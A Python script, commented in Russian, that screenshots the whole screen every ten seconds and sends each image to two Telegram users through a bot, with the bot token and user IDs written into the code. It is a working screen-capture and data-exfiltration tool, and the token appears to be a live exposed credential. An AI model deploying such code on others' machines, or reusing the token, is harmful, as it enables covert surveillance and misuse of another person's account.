import time
import requests
import pyautogui
import io

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8484577605:AAHB7P9rlJZtbL22Wi4gkETvuJV95EF3_hA"  # твой токен
USER_IDS = [5408815833, 5155641417]  # два user_id
INTERVAL = 10  # интервал между скринами (сек)
# ============================================

SEND_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"


def send_screenshot():
    try:
        # делаем скрин
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)

        for uid in USER_IDS:
            img_bytes.seek(0)  # обязательно после каждой отправки
            files = {"photo": ("screenshot.png", img_bytes)}
            data = {"chat_id": uid}
            response = requests.post(SEND_URL, data=data, files=files)

            if response.status_code == 200:
                print(f"[OK] Скрин отправлен пользователю {uid}")
            else:
                print(f"[ERROR] Пользователь {uid}, статус: {response.status_code}, {response.text}")

    except Exception as e:
        print(f"[EXCEPTION] Ошибка при отправке: {e}")


print("Скрипт запущен. Ctrl+C чтобы остановить.")

while True:
    send_screenshot()
    time.sleep(INTERVAL)
